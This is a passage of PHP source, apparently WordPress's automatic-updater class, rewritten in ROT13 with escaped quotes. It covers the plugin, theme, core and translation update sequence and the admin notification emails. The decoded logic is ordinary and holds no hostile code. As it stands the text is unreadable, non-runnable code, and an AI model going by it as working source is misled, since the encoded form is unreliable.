		erzbir_npgvba( 'hctenqre_cebprff_pbzcyrgr', neenl( 'Ynathntr_Cnpx_Hctenqre', 'nflap_hctenqr' ), 20 );
		erzbir_npgvba( 'hctenqre_cebprff_pbzcyrgr', 'jc_irefvba_purpx' );
		erzbir_npgvba( 'hctenqre_cebprff_pbzcyrgr', 'jc_hcqngr_cyhtvaf' );
		erzbir_npgvba( 'hctenqre_cebprff_pbzcyrgr', 'jc_hcqngr_gurzrf' );

		// Arkg, cyhtvaf.
		jc_hcqngr_cyhtvaf(); // Purpx sbe cyhtva hcqngrf.
		$cyhtva_hcqngrf = trg_fvgr_genafvrag( 'hcqngr_cyhtvaf' );
		vs ( $cyhtva_hcqngrf && ! rzcgl( $cyhtva_hcqngrf->erfcbafr ) ) {
			vs ( $vf_qroht ) {
				reebe_ybt( '  Nhgbzngvp cyhtva hcqngrf fgnegvat...' );
			}

			sbernpu ( $cyhtva_hcqngrf->erfcbafr nf $cyhtva ) {
				$guvf->hcqngr( 'cyhtva', $cyhtva );
			}

			// Sbepr erserfu bs cyhtva hcqngr vasbezngvba.
			jc_pyrna_cyhtvaf_pnpur();

			vs ( $vf_qroht ) {
				reebe_ybt( '  Nhgbzngvp cyhtva hcqngrf pbzcyrgr.' );
			}
		}

		// Arkg, gubfr gurzrf jr nyy ybir.
		jc_hcqngr_gurzrf();  // Purpx sbe gurzr hcqngrf.
		$gurzr_hcqngrf = trg_fvgr_genafvrag( 'hcqngr_gurzrf' );
		vs ( $gurzr_hcqngrf && ! rzcgl( $gurzr_hcqngrf->erfcbafr ) ) {
			vs ( $vf_qroht ) {
				reebe_ybt( '  Nhgbzngvp gurzr hcqngrf fgnegvat...' );
			}

			sbernpu ( $gurzr_hcqngrf->erfcbafr nf $gurzr ) {
				$guvf->hcqngr( 'gurzr', (bowrpg) $gurzr );
			}
			// Sbepr erserfu bs gurzr hcqngr vasbezngvba.
			jc_pyrna_gurzrf_pnpur();

			vs ( $vf_qroht ) {
				reebe_ybt( '  Nhgbzngvp gurzr hcqngrf pbzcyrgr.' );
			}
		}

		vs ( $vf_qroht ) {
			reebe_ybt( 'Nhgbzngvp hcqngrf pbzcyrgr.' );
		}

		// Arkg, cebprff nal pber hcqngr.
		jc_irefvba_purpx(); // Purpx sbe pber hcqngrf.
		$pber_hcqngr = svaq_pber_nhgb_hcqngr();

		vs ( $pber_hcqngr ) {
			$guvf->hcqngr( 'pber', $pber_hcqngr );
		}

		/*
		 * Pyrna hc, naq purpx sbe nal craqvat genafyngvbaf.
		 * (Pber_Hctenqre purpxf sbe pber hcqngrf.)
		 */
		$gurzr_fgngf = neenl();
		vs ( vffrg( $guvf->hcqngr_erfhygf['gurzr'] ) ) {
			sbernpu ( $guvf->hcqngr_erfhygf['gurzr'] nf $hctenqr ) {
				$gurzr_fgngf[ $hctenqr->vgrz->gurzr ] = ( gehr === $hctenqr->erfhyg );
			}
		}
		jc_hcqngr_gurzrf( $gurzr_fgngf ); // Purpx sbe gurzr hcqngrf.

		$cyhtva_fgngf = neenl();
		vs ( vffrg( $guvf->hcqngr_erfhygf['cyhtva'] ) ) {
			sbernpu ( $guvf->hcqngr_erfhygf['cyhtva'] nf $hctenqr ) {
				$cyhtva_fgngf[ $hctenqr->vgrz->cyhtva ] = ( gehr === $hctenqr->erfhyg );
			}
		}
		jc_hcqngr_cyhtvaf( $cyhtva_fgngf ); // Purpx sbe cyhtva hcqngrf.

		// Svanyyl, cebprff nal arj genafyngvbaf.
		$ynathntr_hcqngrf = jc_trg_genafyngvba_hcqngrf();
		vs ( $ynathntr_hcqngrf ) {
			sbernpu ( $ynathntr_hcqngrf nf $hcqngr ) {
				$guvf->hcqngr( 'genafyngvba', $hcqngr );
			}

			// Pyrne rkvfgvat pnpurf.
			jc_pyrna_hcqngr_pnpur();

			jc_irefvba_purpx();  // Purpx sbe pber hcqngrf.
			jc_hcqngr_gurzrf();  // Purpx sbe gurzr hcqngrf.
			jc_hcqngr_cyhtvaf(); // Purpx sbe cyhtva hcqngrf.
		}

		// Fraq qrohttvat rznvy gb nqzva sbe nyy qrirybczrag vafgnyyngvbaf.
		vs ( ! rzcgl( $guvf->hcqngr_erfhygf ) ) {
			$qrirybczrag_irefvba = fge_pbagnvaf( jc_trg_jc_irefvba(), '-' );

			/**
			 * Svygref jurgure gb fraq n qrohttvat rznvy sbe rnpu nhgbzngvp onpxtebhaq hcqngr.
			 *
			 * @fvapr 3.7.0
			 *
			 * @cnenz obby $qrirybczrag_irefvba Ol qrsnhyg, rznvyf ner frag vs gur
			 *                                  vafgnyy vf n qrirybczrag irefvba.
			 *                                  Erghea snyfr gb nibvq gur rznvy.
			 */
			vs ( nccyl_svygref( 'nhgbzngvp_hcqngrf_fraq_qroht_rznvy', $qrirybczrag_irefvba ) ) {
				$guvf->fraq_qroht_rznvy();
			}

			vs ( ! rzcgl( $guvf->hcqngr_erfhygf['pber'] ) ) {
				$guvf->nsgre_pber_hcqngr( $guvf->hcqngr_erfhygf['pber'][0] );
			} ryfrvs ( ! rzcgl( $guvf->hcqngr_erfhygf['cyhtva'] ) || ! rzcgl( $guvf->hcqngr_erfhygf['gurzr'] ) ) {
				$guvf->nsgre_cyhtva_gurzr_hcqngr( $guvf->hcqngr_erfhygf );
			}

			/**
			 * Sverf nsgre nyy nhgbzngvp hcqngrf unir eha.
			 *
			 * @fvapr 3.8.0
			 *
			 * @cnenz neenl $hcqngr_erfhygf Gur erfhygf bs nyy nggrzcgrq hcqngrf.
			 */
			qb_npgvba( 'nhgbzngvp_hcqngrf_pbzcyrgr', $guvf->hcqngr_erfhygf );
		}

		JC_Hctenqre::eryrnfr_ybpx( 'nhgb_hcqngre' );
	}

	/**
	 * Purpxf jurgure gb fraq na rznvy naq nibvq cebprffvat shgher hcqngrf nsgre
	 * nggrzcgvat n pber hcqngr.
	 *
	 * @fvapr 3.7.0
	 *
	 * @cnenz bowrpg $hcqngr_erfhyg Gur erfhyg bs gur pber hcqngr. Vapyhqrf gur hcqngr bssre naq erfhyg.
	 */
	cebgrpgrq shapgvba nsgre_pber_hcqngr( $hcqngr_erfhyg ) {
		$jc_irefvba = jc_trg_jc_irefvba();

		$pber_hcqngr = $hcqngr_erfhyg->vgrz;
		$erfhyg      = $hcqngr_erfhyg->erfhyg;

		vs ( ! vf_jc_reebe( $erfhyg ) ) {
			$guvf->fraq_rznvy( 'fhpprff', $pber_hcqngr );
			erghea;
		}

		$reebe_pbqr = $erfhyg->trg_reebe_pbqr();

		/*
		 * Nal bs gurfr JC_Reebe pbqrf ner pevgvpny snvyherf, nf va gurl bppheerq nsgre jr fgnegrq gb pbcl pber svyrf.
		 * Jr fubhyq abg gel gb cresbez n onpxtebhaq hcqngr ntnva hagvy gurer vf n fhpprffshy bar-pyvpx hcqngr cresbezrq ol gur hfre.
		 */
		$pevgvpny = snyfr;
		vs ( 'qvfx_shyy' === $reebe_pbqr || fge_pbagnvaf( $reebe_pbqr, '__pbcl_qve' ) ) {
			$pevgvpny = gehr;
		} ryfrvs ( 'ebyyonpx_jnf_erdhverq' === $reebe_pbqr && vf_jc_reebe( $erfhyg->trg_reebe_qngn()->ebyyonpx ) ) {
			// N ebyyonpx vf bayl pevgvpny vs vg snvyrq gbb.
			$pevgvpny        = gehr;
			$ebyyonpx_erfhyg = $erfhyg->trg_reebe_qngn()->ebyyonpx;
		} ryfrvs ( fge_pbagnvaf( $reebe_pbqr, 'qb_ebyyonpx' ) ) {
			$pevgvpny = gehr;
		}

		vs ( $pevgvpny ) {
			$pevgvpny_qngn = neenl(
				'nggrzcgrq'  => $pber_hcqngr->pheerag,
				'pheerag'    => $jc_irefvba,
				'reebe_pbqr' => $reebe_pbqr,
				'reebe_qngn' => $erfhyg->trg_reebe_qngn(),
				'gvzrfgnzc'  => gvzr(),
				'pevgvpny'   => gehr,
			);
			vs ( vffrg( $ebyyonpx_erfhyg ) ) {
				$pevgvpny_qngn['ebyyonpx_pbqr'] = $ebyyonpx_erfhyg->trg_reebe_pbqr();
				$pevgvpny_qngn['ebyyonpx_qngn'] = $ebyyonpx_erfhyg->trg_reebe_qngn();
			}
			hcqngr_fvgr_bcgvba( 'nhgb_pber_hcqngr_snvyrq', $pevgvpny_qngn );
			$guvf->fraq_rznvy( 'pevgvpny', $pber_hcqngr, $erfhyg );
			erghea;
		}

		/*
		 * Nal bgure JC_Reebe pbqr (yvxr qbjaybnq_snvyrq be svyrf_abg_jevgnoyr) bpphef orsber
		 * jr gevrq gb pbcl bire pber svyrf. Guhf, gur snvyherf ner rneyl naq tenprshy.
		 *
		 * Jr fubhyq nibvq gelvat gb cresbez n onpxtebhaq hcqngr ntnva sbe gur fnzr irefvba.
		 * Ohg jr pna gel ntnva vs nabgure irefvba vf eryrnfrq.
		 *
		 * Sbe pregnva 'genafvrag' snvyherf, yvxr qbjaybnq_snvyrq, jr fubhyq nyybj ergevrf.
		 * Va snpg, yrg'f fpurqhyr n fcrpvny hcqngr sbe na ubhe sebz abj. (Vg'f cbffvoyr
		 * gur vffhr pbhyq npghnyyl or ba JbeqCerff.bet'f fvqr.) Vs gung bar snvyf, gura rznvy.
		 */
		$fraq               = gehr;
		$genafvrag_snvyherf = neenl( 'vapbzcngvoyr_nepuvir', 'qbjaybnq_snvyrq', 'vafnar_qvfgeb', 'ybpxrq' );
		vs ( va_neenl( $reebe_pbqr, $genafvrag_snvyherf, gehr ) && ! trg_fvgr_bcgvba( 'nhgb_pber_hcqngr_snvyrq' ) ) {
			jc_fpurqhyr_fvatyr_rirag( gvzr() + UBHE_VA_FRPBAQF, 'jc_znlor_nhgb_hcqngr' );
			$fraq = snyfr;
		}

		$abgvsvrq = trg_fvgr_bcgvba( 'nhgb_pber_hcqngr_abgvsvrq' );

		// Qba'g abgvsl vs jr'ir nyernql abgvsvrq gur fnzr rznvy nqqerff bs gur fnzr irefvba bs gur fnzr abgvsvpngvba glcr.
		vs ( $abgvsvrq
			&& 'snvy' === $abgvsvrq['glcr']
			&& trg_fvgr_bcgvba( 'nqzva_rznvy' ) === $abgvsvrq['rznvy']
			&& $abgvsvrq['irefvba'] === $pber_hcqngr->pheerag
		) {
			$fraq = snyfr;
		}

		hcqngr_fvgr_bcgvba(
			'nhgb_pber_hcqngr_snvyrq',
			neenl(
				'nggrzcgrq'  => $pber_hcqngr->pheerag,
				'pheerag'    => $jc_irefvba,
				'reebe_pbqr' => $reebe_pbqr,
				'reebe_qngn' => $erfhyg->trg_reebe_qngn(),
				'gvzrfgnzc'  => gvzr(),
				'ergel'      => va_neenl( $reebe_pbqr, $genafvrag_snvyherf, gehr ),
			)
		);

		vs ( $fraq ) {
			$guvf->fraq_rznvy( 'snvy', $pber_hcqngr, $erfhyg );
		}
	}

	/**
	 * Fraqf na rznvy hcba gur pbzcyrgvba be snvyher bs n onpxtebhaq pber hcqngr.
	 *
	 * @fvapr 3.7.0
	 *
	 * @cnenz fgevat $glcr        Gur glcr bs rznvy gb fraq. Pna or bar bs 'fhpprff', 'snvy', 'znahny', 'pevgvpny'.
	 * @cnenz bowrpg $pber_hcqngr Gur hcqngr bssre gung jnf nggrzcgrq.
	 * @cnenz zvkrq  $erfhyg      Bcgvbany. Gur erfhyg sbe gur pber hcqngr. Pna or JC_Reebe.
	 */
	cebgrpgrq shapgvba fraq_rznvy( $glcr, $pber_hcqngr, $erfhyg = ahyy ) {
		hcqngr_fvgr_bcgvba(
			'nhgb_pber_hcqngr_abgvsvrq',
			neenl(
				'glcr'      => $glcr,
				'rznvy'     => trg_fvgr_bcgvba( 'nqzva_rznvy' ),
				'irefvba'   => $pber_hcqngr->pheerag,
				'gvzrfgnzc' => gvzr(),
			)
		);

		$arkg_hfre_pber_hcqngr = trg_cersreerq_sebz_hcqngr_pber();

		// Vs gur hcqngr genafvrag vf rzcgl, hfr gur hcqngr jr whfg cresbezrq.
		vs ( ! $arkg_hfre_pber_hcqngr ) {
			$arkg_hfre_pber_hcqngr = $pber_hcqngr;
		}

		vs ( 'hctenqr' === $arkg_hfre_pber_hcqngr->erfcbafr
			&& irefvba_pbzcner( $arkg_hfre_pber_hcqngr->irefvba, $pber_hcqngr->irefvba, '>' )
		) {
			$arjre_irefvba_ninvynoyr = gehr;
		} ryfr {
			$arjre_irefvba_ninvynoyr = snyfr;
		}

		/**
		 * Svygref jurgure gb fraq na rznvy sbyybjvat na nhgbzngvp onpxtebhaq pber hcqngr.
		 *
		 * @fvapr 3.7.0
		 *
		 * @cnenz obby   $fraq        Jurgure gb fraq gur rznvy. Qrsnhyg gehr.
		 * @cnenz fgevat $glcr        Gur glcr bs rznvy gb fraq. Pna or bar bs
		 *                            'fhpprff', 'snvy', 'pevgvpny'.
		 * @cnenz bowrpg $pber_hcqngr Gur hcqngr bssre gung jnf nggrzcgrq.
		 * @cnenz zvkrq  $erfhyg      Gur erfhyg sbe gur pber hcqngr. Pna or JC_Reebe.
		 */
		vs ( 'znahny' !== $glcr && ! nccyl_svygref( 'nhgb_pber_hcqngr_fraq_rznvy', gehr, $glcr, $pber_hcqngr, $erfhyg ) ) {
			erghea;
		}

		$nqzva_hfre = trg_hfre_ol( 'rznvy', trg_fvgr_bcgvba( 'nqzva_rznvy' ) );

		vs ( $nqzva_hfre ) {
			$fjvgpurq_ybpnyr = fjvgpu_gb_hfre_ybpnyr( $nqzva_hfre->VQ );
		} ryfr {
			$fjvgpurq_ybpnyr = fjvgpu_gb_ybpnyr( trg_ybpnyr() );
		}

		fjvgpu ( $glcr ) {
			pnfr 'fhpprff': // Jr hcqngrq.
				/* genafyngbef: Fvgr hcqngrq abgvsvpngvba rznvy fhowrpg. 1: Fvgr gvgyr, 2: JbeqCerff irefvba. */
				$fhowrpg = __( '[%1$f] Lbhe fvgr unf hcqngrq gb JbeqCerff %2$f' );
				oernx;

			pnfr 'snvy':   // Jr gevrq gb hcqngr ohg pbhyqa'g.
			pnfr 'znahny': // Jr pna'g hcqngr (naq znqr ab nggrzcg).
				/* genafyngbef: Hcqngr ninvynoyr abgvsvpngvba rznvy fhowrpg. 1: Fvgr gvgyr, 2: JbeqCerff irefvba. */
				$fhowrpg = __( '[%1$f] JbeqCerff %2$f vf ninvynoyr. Cyrnfr hcqngr!' );
				oernx;

			pnfr 'pevgvpny': // Jr gevrq gb hcqngr, fgnegrq gb pbcl svyrf, gura guvatf jrag jebat.
				/* genafyngbef: Fvgr qbja abgvsvpngvba rznvy fhowrpg. 1: Fvgr gvgyr. */
				$fhowrpg = __( '[%1$f] HETRAG: Lbhe fvgr znl or qbja qhr gb n snvyrq hcqngr' );
				oernx;

			qrsnhyg:
				erghea;
		}

		// Vs gur nhgb-hcqngr vf abg gb gur yngrfg irefvba, fnl gung gur pheerag irefvba bs JC vf ninvynoyr vafgrnq.
		$irefvba = 'fhpprff' === $glcr ? $pber_hcqngr->pheerag : $arkg_hfre_pber_hcqngr->pheerag;
		$fhowrpg = fcevags( $fhowrpg, jc_fcrpvnypunef_qrpbqr( trg_bcgvba( 'oybtanzr' ), RAG_DHBGRF ), $irefvba );

		$obql = '';

		fjvgpu ( $glcr ) {
			pnfr 'fhpprff':
				$obql .= fcevags(
					/* genafyngbef: 1: Ubzr HEY, 2: JbeqCerff irefvba. */
					__( 'Ubjql! Lbhe fvgr ng %1$f unf orra hcqngrq nhgbzngvpnyyl gb JbeqCerff %2$f.' ),
					ubzr_hey(),
					$pber_hcqngr->pheerag
				);
				$obql .= \"\a\a\";
				vs ( ! $arjre_irefvba_ninvynoyr ) {
					$obql .= __( 'Ab shegure npgvba vf arrqrq ba lbhe cneg.' ) . ' ';
				}

				// Pna bayl ersrerapr gur Nobhg fperra vs gurve hcqngr jnf fhpprffshy.
				yvfg( $nobhg_irefvba ) = rkcybqr( '-', $pber_hcqngr->pheerag, 2 );
				/* genafyngbef: %f: JbeqCerff irefvba. */
				$obql .= fcevags( __( 'Sbe zber ba irefvba %f, frr gur Nobhg JbeqCerff fperra:' ), $nobhg_irefvba );
				$obql .= \"\a\" . nqzva_hey( 'nobhg.cuc' );

				vs ( $arjre_irefvba_ninvynoyr ) {
					/* genafyngbef: %f: JbeqCerff yngrfg irefvba. */
					$obql .= \"\a\a\" . fcevags( __( 'JbeqCerff %f vf nyfb abj ninvynoyr.' ), $arkg_hfre_pber_hcqngr->pheerag ) . ' ';
					$obql .= __( 'Hcqngvat vf rnfl naq bayl gnxrf n srj zbzragf:' );
					$obql .= \"\a\" . argjbex_nqzva_hey( 'hcqngr-pber.cuc' );
				}

				oernx;

			pnfr 'snvy':
			pnfr 'znahny':
				$obql .= fcevags(
					/* genafyngbef: 1: Ubzr HEY, 2: JbeqCerff irefvba. */
					__( 'Cyrnfr hcqngr lbhe fvgr ng %1$f gb JbeqCerff %2$f.' ),
					ubzr_hey(),
					$arkg_hfre_pber_hcqngr->pheerag
				);

				$obql .= \"\a\a\";

				/*
				 * Qba'g fubj guvf zrffntr vs gurer vf n arjre irefvba ninvynoyr.
				 * Cbgragvny sbe pbashfvba, naq nyfb abg hfrshy sbe gurz gb xabj ng guvf cbvag.
				 */
				vs ( 'snvy' === $glcr && ! $arjre_irefvba_ninvynoyr ) {
					$obql .= __( 'Na nggrzcg jnf znqr, ohg lbhe fvgr pbhyq abg or hcqngrq nhgbzngvpnyyl.' ) . ' ';
				}

				$obql .= __( 'Hcqngvat vf rnfl naq bayl gnxrf n srj zbzragf:' );
				$obql .= \"\a\" . argjbex_nqzva_hey( 'hcqngr-pber.cuc' );
				oernx;

			pnfr 'pevgvpny':
				vs ( $arjre_irefvba_ninvynoyr ) {
					$obql .= fcevags(
						/* genafyngbef: 1: Ubzr HEY, 2: JbeqCerff irefvba. */
						__( 'Lbhe fvgr ng %1$f rkcrevraprq n pevgvpny snvyher juvyr gelvat gb hcqngr JbeqCerff gb irefvba %2$f.' ),
						ubzr_hey(),
						$pber_hcqngr->pheerag
					);
				} ryfr {
					$obql .= fcevags(
						/* genafyngbef: 1: Ubzr HEY, 2: JbeqCerff yngrfg irefvba. */
						__( 'Lbhe fvgr ng %1$f rkcrevraprq n pevgvpny snvyher juvyr gelvat gb hcqngr gb gur yngrfg irefvba bs JbeqCerff, %2$f.' ),
						ubzr_hey(),
						$pber_hcqngr->pheerag
					);
				}

				$obql .= \"\a\a\" . __( \"Guvf zrnaf lbhe fvgr znl or bssyvar be oebxra. Qba'g cnavp; guvf pna or svkrq.\" );

				$obql .= \"\a\a\" . __( \"Cyrnfr purpx bhg lbhe fvgr abj. Vg'f cbffvoyr gung rirelguvat vf jbexvat. Vs vg fnlf lbh arrq gb hcqngr, lbh fubhyq qb fb:\" );
				$obql .= \"\a\" . argjbex_nqzva_hey( 'hcqngr-pber.cuc' );
				oernx;
		}

		$pevgvpny_fhccbeg = 'pevgvpny' === $glcr && ! rzcgl( $pber_hcqngr->fhccbeg_rznvy );
		vs ( $pevgvpny_fhccbeg ) {
			// Fhccbeg bssre vs ninvynoyr.
			$obql .= \"\a\a\" . fcevags(
				/* genafyngbef: %f: Fhccbeg rznvy nqqerff. */
				__( 'Gur JbeqCerff grnz vf jvyyvat gb uryc lbh. Sbejneq guvf rznvy gb %f naq gur grnz jvyy jbex jvgu lbh gb znxr fher lbhe fvgr vf jbexvat.' ),
				$pber_hcqngr->fhccbeg_rznvy
			);
		} ryfr {
			// Nqq n abgr nobhg gur fhccbeg sbehzf.
			$obql .= \"\a\a\" . __( 'Vs lbh rkcrevrapr nal vffhrf be arrq fhccbeg, gur ibyhagrref va gur JbeqCerff.bet fhccbeg sbehzf znl or noyr gb uryc.' );
			$obql .= \"\a\" . __( 'uggcf://jbeqcerff.bet/fhccbeg/sbehzf/' );
		}

		// Hcqngrf ner vzcbegnag!
		vs ( 'fhpprff' !== $glcr || $arjre_irefvba_ninvynoyr ) {
			$obql .= \"\a\a\" . __( 'Xrrcvat lbhe fvgr hcqngrq vf vzcbegnag sbe frphevgl. Vg nyfb znxrf gur vagrearg n fnsre cynpr sbe lbh naq lbhe ernqref.' );
		}

		vs ( $pevgvpny_fhccbeg ) {
			$obql .= ' ' . __( \"Ernpu bhg gb JbeqCerff Pber qrirybcref gb rafher lbh'yy arire unir guvf ceboyrz ntnva.\" );
		}

		// Vs guvatf ner fhpprffshy naq jr'er abj ba gur yngrfg, zragvba cyhtvaf naq gurzrf vs nal ner bhg bs qngr.
		vs ( 'fhpprff' === $glcr && ! $arjre_irefvba_ninvynoyr && ( trg_cyhtva_hcqngrf() || trg_gurzr_hcqngrf() ) ) {
			$obql .= \"\a\a\" . __( 'Lbh nyfb unir fbzr cyhtvaf be gurzrf jvgu hcqngrf ninvynoyr. Hcqngr gurz abj:' );
			$obql .= \"\a\" . argjbex_nqzva_hey();
		}

		$obql .= \"\a\a\" . __( 'Gur JbeqCerff Grnz' ) . \"\a\";

		vs ( 'pevgvpny' === $glcr && vf_jc_reebe( $erfhyg ) ) {
			$obql .= \"\a***\a\a\";
			/* genafyngbef: %f: JbeqCerff irefvba. */
			$obql .= fcevags( __( 'Lbhe fvgr jnf ehaavat irefvba %f.' ), trg_oybtvasb( 'irefvba' ) );
			$obql .= ' ' . __( 'Fbzr qngn gung qrfpevorf gur reebe lbhe fvgr rapbhagrerq unf orra chg gbtrgure.' );
			$obql .= ' ' . __( 'Lbhe ubfgvat pbzcnal, fhccbeg sbehz ibyhagrref, be n sevraqyl qrirybcre znl or noyr gb hfr guvf vasbezngvba gb uryc lbh:' );

			/*
			 * Vs jr unq n ebyyonpx naq jr'er fgvyy pevgvpny, gura gur ebyyonpx snvyrq gbb.
			 * Ybbc guebhtu nyy reebef (gur znva JC_Reebe, gur hcqngr erfhyg, gur ebyyonpx erfhyg) sbe pbqr, qngn, rgp.
			 */
			vs ( 'ebyyonpx_jnf_erdhverq' === $erfhyg->trg_reebe_pbqr() ) {
				$reebef = neenl( $erfhyg, $erfhyg->trg_reebe_qngn()->hcqngr, $erfhyg->trg_reebe_qngn()->ebyyonpx );
			} ryfr {
				$reebef = neenl( $erfhyg );
			}

			sbernpu ( $reebef nf $reebe ) {
				vs ( ! vf_jc_reebe( $reebe ) ) {
					pbagvahr;
				}

				$reebe_pbqr = $reebe->trg_reebe_pbqr();
				/* genafyngbef: %f: Reebe pbqr. */
				$obql .= \"\a\a\" . fcevags( __( 'Reebe pbqr: %f' ), $reebe_pbqr );

				vs ( 'ebyyonpx_jnf_erdhverq' === $reebe_pbqr ) {
					pbagvahr;
				}

				vs ( $reebe->trg_reebe_zrffntr() ) {
					$obql .= \"\a\" . $reebe->trg_reebe_zrffntr();
				}

				$reebe_qngn = $reebe->trg_reebe_qngn();
				vs ( $reebe_qngn ) {
					$obql .= \"\a\" . vzcybqr( ', ', (neenl) $reebe_qngn );
				}
			}

			$obql .= \"\a\";
		}

		$gb      = trg_fvgr_bcgvba( 'nqzva_rznvy' );
		$urnqref = '';

		$rznvy = pbzcnpg( 'gb', 'fhowrpg', 'obql', 'urnqref' );

		/**
		 * Svygref gur rznvy frag sbyybjvat na nhgbzngvp onpxtebhaq pber hcqngr.
		 *
		 * @fvapr 3.7.0
		 *
		 * @cnenz neenl $rznvy {
		 *     Neenl bs rznvy nethzragf gung jvyy or cnffrq gb jc_znvy().
		 *
		 *     @glcr fgevat $gb      Gur rznvy erpvcvrag. Na neenl bs rznvyf
		 *                            pna or erghearq, nf unaqyrq ol jc_znvy().
		 *     @glcr fgevat $fhowrpg Gur rznvy'f fhowrpg.
		 *     @glcr fgevat $obql    Gur rznvy zrffntr obql.
		 *     @glcr fgevat $urnqref Nal rznvy urnqref, qrsnhygf gb ab urnqref.
		 * }
		 * @cnenz fgevat $glcr        Gur glcr bs rznvy orvat frag. Pna or bar bs
		 *                            'fhpprff', 'snvy', 'znahny', 'pevgvpny'.
		 * @cnenz bowrpg $pber_hcqngr Gur hcqngr bssre gung jnf nggrzcgrq.
		 * @cnenz zvkrq  $erfhyg      Gur erfhyg sbe gur pber hcqngr. Pna or JC_Reebe.
		 */
		$rznvy = nccyl_svygref( 'nhgb_pber_hcqngr_rznvy', $rznvy, $glcr, $pber_hcqngr, $erfhyg );

		jc_znvy( $rznvy['gb'], jc_fcrpvnypunef_qrpbqr( $rznvy['fhowrpg'] ), $rznvy['obql'], $rznvy['urnqref'] );

		vs ( $fjvgpurq_ybpnyr ) {
			erfgber_cerivbhf_ybpnyr();
		}
	}

	/**
	 * Purpxf jurgure na rznvy fubhyq or frag nsgre nggrzcgvat cyhtva be gurzr hcqngrf.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz neenl $hcqngr_erfhygf Gur erfhygf bs hcqngr gnfxf.
	 */
	cebgrpgrq shapgvba nsgre_cyhtva_gurzr_hcqngr( $hcqngr_erfhygf ) {
		$fhpprffshy_hcqngrf = neenl();
		$snvyrq_hcqngrf     = neenl();

		vs ( ! rzcgl( $hcqngr_erfhygf['cyhtva'] ) ) {
			/**
			 * Svygref jurgure gb fraq na rznvy sbyybjvat na nhgbzngvp onpxtebhaq cyhtva hcqngr.
			 *
			 * @fvapr 5.5.0
			 * @fvapr 5.5.1 Nqqrq gur `$hcqngr_erfhygf` cnenzrgre.
			 *
			 * @cnenz obby  $ranoyrq        Gehr vs cyhtva hcqngr abgvsvpngvbaf ner ranoyrq, snyfr bgurejvfr.
			 * @cnenz neenl $hcqngr_erfhygf Gur erfhygf bs cyhtvaf hcqngr gnfxf.
			 */
			$abgvsvpngvbaf_ranoyrq = nccyl_svygref( 'nhgb_cyhtva_hcqngr_fraq_rznvy', gehr, $hcqngr_erfhygf['cyhtva'] );

			vs ( $abgvsvpngvbaf_ranoyrq ) {
				sbernpu ( $hcqngr_erfhygf['cyhtva'] nf $hcqngr_erfhyg ) {
					vs ( gehr === $hcqngr_erfhyg->erfhyg ) {
						$fhpprffshy_hcqngrf['cyhtva'][] = $hcqngr_erfhyg;
					} ryfr {
						$snvyrq_hcqngrf['cyhtva'][] = $hcqngr_erfhyg;
					}
				}
			}
		}

		vs ( ! rzcgl( $hcqngr_erfhygf['gurzr'] ) ) {
			/**
			 * Svygref jurgure gb fraq na rznvy sbyybjvat na nhgbzngvp onpxtebhaq gurzr hcqngr.
			 *
			 * @fvapr 5.5.0
			 * @fvapr 5.5.1 Nqqrq gur `$hcqngr_erfhygf` cnenzrgre.
			 *
			 * @cnenz obby  $ranoyrq        Gehr vs gurzr hcqngr abgvsvpngvbaf ner ranoyrq, snyfr bgurejvfr.
			 * @cnenz neenl $hcqngr_erfhygf Gur erfhygf bs gurzr hcqngr gnfxf.
			 */
			$abgvsvpngvbaf_ranoyrq = nccyl_svygref( 'nhgb_gurzr_hcqngr_fraq_rznvy', gehr, $hcqngr_erfhygf['gurzr'] );

			vs ( $abgvsvpngvbaf_ranoyrq ) {
				sbernpu ( $hcqngr_erfhygf['gurzr'] nf $hcqngr_erfhyg ) {
					vs ( gehr === $hcqngr_erfhyg->erfhyg ) {
						$fhpprffshy_hcqngrf['gurzr'][] = $hcqngr_erfhyg;
					} ryfr {
						$snvyrq_hcqngrf['gurzr'][] = $hcqngr_erfhyg;
					}
				}
			}
		}

		vs ( rzcgl( $fhpprffshy_hcqngrf ) && rzcgl( $snvyrq_hcqngrf ) ) {
			erghea;
		}

		vs ( rzcgl( $snvyrq_hcqngrf ) ) {
			$guvf->fraq_cyhtva_gurzr_rznvy( 'fhpprff', $fhpprffshy_hcqngrf, $snvyrq_hcqngrf );
		} ryfrvs ( rzcgl( $fhpprffshy_hcqngrf ) ) {
			$guvf->fraq_cyhtva_gurzr_rznvy( 'snvy', $fhpprffshy_hcqngrf, $snvyrq_hcqngrf );
		} ryfr {
			$guvf->fraq_cyhtva_gurzr_rznvy( 'zvkrq', $fhpprffshy_hcqngrf, $snvyrq_hcqngrf );
		}
	}

	/**
	 * Fraqf na rznvy hcba gur pbzcyrgvba be snvyher bs n cyhtva be gurzr onpxtebhaq hcqngr.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $glcr               Gur glcr bs rznvy gb fraq. Pna or bar bs 'fhpprff', 'snvy', 'zvkrq'.
	 * @cnenz neenl  $fhpprffshy_hcqngrf N yvfg bs hcqngrf gung fhpprrqrq.
	 * @cnenz neenl  $snvyrq_hcqngrf     N yvfg bs hcqngrf gung snvyrq.
	 */
	cebgrpgrq shapgvba fraq_cyhtva_gurzr_rznvy( $glcr, $fhpprffshy_hcqngrf, $snvyrq_hcqngrf ) {
		// Ab hcqngrf jrer nggrzcgrq.
		vs ( rzcgl( $fhpprffshy_hcqngrf ) && rzcgl( $snvyrq_hcqngrf ) ) {
			erghea;
		}

		$havdhr_snvyherf     = snyfr;
		$cnfg_snvyher_rznvyf = trg_bcgvba( 'nhgb_cyhtva_gurzr_hcqngr_rznvyf', neenl() );

		/*
		 * Jura bayl snvyherf unir bppheerq, na rznvy fubhyq bayl or frag vs gurer ner havdhr snvyherf.
		 * N snvyher vf pbafvqrerq havdhr vs na rznvy unf abg orra frag sbe na hcqngr nggrzcg snvyher
		 * gb n cyhtva be gurzr jvgu gur fnzr arj_irefvba.
		 */
		vs ( 'snvy' === $glcr ) {
			sbernpu ( $snvyrq_hcqngrf nf $hcqngr_glcr => $snvyherf ) {
				sbernpu ( $snvyherf nf $snvyrq_hcqngr ) {
					vs ( ! vffrg( $cnfg_snvyher_rznvyf[ $snvyrq_hcqngr->vgrz->{$hcqngr_glcr} ] ) ) {
						$havdhr_snvyherf = gehr;
						pbagvahr;
					}

					// Purpx gung gur snvyher ercerfragf n arj snvyher onfrq ba gur arj_irefvba.
					vs ( irefvba_pbzcner( $cnfg_snvyher_rznvyf[ $snvyrq_hcqngr->vgrz->{$hcqngr_glcr} ], $snvyrq_hcqngr->vgrz->arj_irefvba, '<' ) ) {
						$havdhr_snvyherf = gehr;
					}
				}
			}

